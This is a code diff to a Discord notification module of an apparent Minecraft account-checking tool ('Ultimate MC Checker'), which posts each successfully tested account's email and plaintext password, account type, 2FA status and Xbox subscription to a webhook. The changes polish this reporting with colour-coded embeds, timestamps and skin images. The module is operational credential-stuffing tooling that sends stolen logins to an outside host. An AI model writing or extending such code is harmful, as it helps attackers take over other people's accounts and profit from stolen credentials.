@@ -3,10 +3,12 @@ discord_notifier.py — Discord webhook notifications (embed + plain-text).
 Extracted from meow.py / DonutSMP Checker.py webhook logic.
 """
 import json
+import datetime
 import requests
 
 _AVATAR_URL = 'https://mc-heads.net/avatar/{name}'
-_FOOTER_TEXT = 'Minecraft Checker Bot'
+_CRAFATAR_URL = 'https://crafatar.com/renders/body/{uuid}?overlay'
+_FOOTER_TEXT = 'Ultimate MC Checker v2.0'
 
 
 def _post_webhook(url: str, payload: dict) -> None:
@@ -96,16 +98,29 @@ def _capture_to_fields(capture_obj) -> list:
     return fields[:25]  # Discord limit
 
 
-def _build_embed(title: str, color: int, fields: list, name: str) -> dict:
+_TYPE_COLORS = {
+    'Hypixel': 0xFFA500,
+    'XboxGamePass': 0x107C10,
+    'XboxGamePassUltimate': 0x9B4DCA,
+    'Normal': 0x57F287,
+}
+
+def _get_color(account_type: str) -> int:
+    return _TYPE_COLORS.get(account_type, 0x57F287)
+
+def _build_embed(title: str, color: int, fields: list, name: str, uuid: str = None) -> dict:
     avatar = _AVATAR_URL.format(name=name) if name and name != 'N/A' else None
     embed = {
         'title': title,
         'color': color,
         'fields': fields,
-        'footer': {'text': _FOOTER_TEXT},
+        'footer': {'text': _FOOTER_TEXT, 'icon_url': 'https://mc-heads.net/avatar/MHF_Steve'},
+        'timestamp': datetime.datetime.utcnow().isoformat(),
     }
     if avatar:
         embed['thumbnail'] = {'url': avatar}
+    if uuid:
+        embed['image'] = {'url': _CRAFATAR_URL.format(uuid=uuid)}
     return embed
 
 
@@ -115,18 +130,30 @@ def send_hit_webhook(capture_obj, config: dict) -> None:
         return
 
     name = getattr(capture_obj, 'name', 'N/A') or 'N/A'
+    acct_type = getattr(capture_obj, 'type', 'N/A') or 'N/A'
+    uuid = getattr(capture_obj, 'uuid', '') or ''
+    color = _get_color(acct_type)
 
     if config.get('discord_embed_mode', True):
         fields = _capture_to_fields(capture_obj)
+        embed = _build_embed(f'🎯 Hit Found — {name}', color, fields, name, uuid)
+        embed['description'] = f'**{acct_type}** account captured'
         payload = {
-            'username': 'Minecraft Checker',
+            'username': 'Ultimate MC Checker',
             'avatar_url': _AVATAR_URL.format(name=name) if name != 'N/A' else None,
-            'embeds': [_build_embed(f'🎯 Hit: {name}', 0x57F287, fields, name)],
+            'embeds': [embed],
         }
     else:
-        lines = [f'🎯 HIT FOUND', f'Email: {capture_obj.email}', f'Password: {capture_obj.password}',
-                 f'Name: {name}', f'Type: {getattr(capture_obj, "type", "N/A")}']
-        payload = {'username': 'Minecraft Checker', 'content': '\n'.join(lines)}
+        lines = [
+            f'🎯 **HIT FOUND**',
+            f'```',
+            f'Email: {capture_obj.email}',
+            f'Password: {capture_obj.password}',
+            f'Name: {name}',
+            f'Type: {acct_type}',
+            f'```',
+        ]
+        payload = {'username': 'Ultimate MC Checker', 'content': '\n'.join(lines)}
 
     _post_webhook(url, payload)
 
@@ -138,21 +165,23 @@ def send_2fa_webhook(email: str, password: str, config: dict) -> None:
 
     if config.get('discord_embed_mode', True):
         payload = {
-            'username': 'Minecraft Checker',
+            'username': 'Ultimate MC Checker',
             'embeds': [{
                 'title': '🔐 2FA Account Found',
                 'color': 0xFF00FF,
+                'description': 'Account requires two-factor authentication',
                 'fields': [
-                    {'name': 'Email', 'value': f'||{email}||', 'inline': True},
-                    {'name': 'Password', 'value': f'||{password}||', 'inline': True},
+                    {'name': 'Email', 'value': f'||`{email}`||', 'inline': True},
+                    {'name': 'Password', 'value': f'||`{password}`||', 'inline': True},
                 ],
-                'footer': {'text': _FOOTER_TEXT},
+                'footer': {'text': _FOOTER_TEXT, 'icon_url': 'https://mc-heads.net/avatar/MHF_Steve'},
+                'timestamp': datetime.datetime.utcnow().isoformat(),
             }],
         }
     else:
         payload = {
-            'username': 'Minecraft Checker',
-            'content': f'🔐 **2FA Account**\nEmail: {email}\nPassword: {password}',
+            'username': 'Ultimate MC Checker',
+            'content': f'🔐 **2FA Account**\n```\nEmail: {email}\nPassword: {password}\n```',
         }
 
     _post_webhook(url, payload)
@@ -163,24 +192,27 @@ def send_xbox_webhook(email: str, password: str, account_type: str, config: dict
     if not url:
         return
 
+    color = _get_color(account_type or '')
     if config.get('discord_embed_mode', True):
         payload = {
-            'username': 'Minecraft Checker',
+            'username': 'Ultimate MC Checker',
             'embeds': [{
-                'title': '🎮 Xbox Account Found',
-                'color': 0x3498DB,
+                'title': f'🎮 Xbox Account — {account_type or "N/A"}',
+                'color': color,
+                'description': f'**{account_type}** subscription detected',
                 'fields': [
-                    {'name': 'Email', 'value': f'||{email}||', 'inline': True},
-                    {'name': 'Password', 'value': f'||{password}||', 'inline': True},
-                    {'name': 'Account Type', 'value': account_type or 'N/A', 'inline': False},
+                    {'name': 'Email', 'value': f'||`{email}`||', 'inline': True},
+                    {'name': 'Password', 'value': f'||`{password}`||', 'inline': True},
+                    {'name': 'Type', 'value': account_type or 'N/A', 'inline': False},
                 ],
-                'footer': {'text': _FOOTER_TEXT},
+                'footer': {'text': _FOOTER_TEXT, 'icon_url': 'https://mc-heads.net/avatar/MHF_Steve'},
+                'timestamp': datetime.datetime.utcnow().isoformat(),
             }],
         }
     else:
         payload = {
-            'username': 'Minecraft Checker',
-            'content': f'🎮 **Xbox Account**\nEmail: {email}\nPassword: {password}\nType: {account_type}',
+            'username': 'Ultimate MC Checker',
+            'content': f'🎮 **Xbox Account**\n```\nEmail: {email}\nPassword: {password}\nType: {account_type}\n```',
         }
 
     _post_webhook(url, payload)
@@ -193,22 +225,24 @@ def send_other_webhook(email: str, password: str, items: str, config: dict) -> N
 
     if config.get('discord_embed_mode', True):
         payload = {
-            'username': 'Minecraft Checker',
+            'username': 'Ultimate MC Checker',
             'embeds': [{
                 'title': '📦 Other Account Found',
                 'color': 0xFFFF00,
+                'description': 'Account with additional entitlements',
                 'fields': [
-                    {'name': 'Email', 'value': f'||{email}||', 'inline': True},
-                    {'name': 'Password', 'value': f'||{password}||', 'inline': True},
+                    {'name': 'Email', 'value': f'||`{email}`||', 'inline': True},
+                    {'name': 'Password', 'value': f'||`{password}`||', 'inline': True},
                     {'name': 'Items', 'value': items or 'N/A', 'inline': False},
                 ],
-                'footer': {'text': _FOOTER_TEXT},
+                'footer': {'text': _FOOTER_TEXT, 'icon_url': 'https://mc-heads.net/avatar/MHF_Steve'},
+                'timestamp': datetime.datetime.utcnow().isoformat(),
             }],
         }
     else:
         payload = {
-            'username': 'Minecraft Checker',
-            'content': f'📦 **Other Account**\nEmail: {email}\nPassword: {password}\nItems: {items}',
+            'username': 'Ultimate MC Checker',
+            'content': f'📦 **Other Account**\n```\nEmail: {email}\nPassword: {password}\nItems: {items}\n```',
         }
 
     _post_webhook(url, payload)
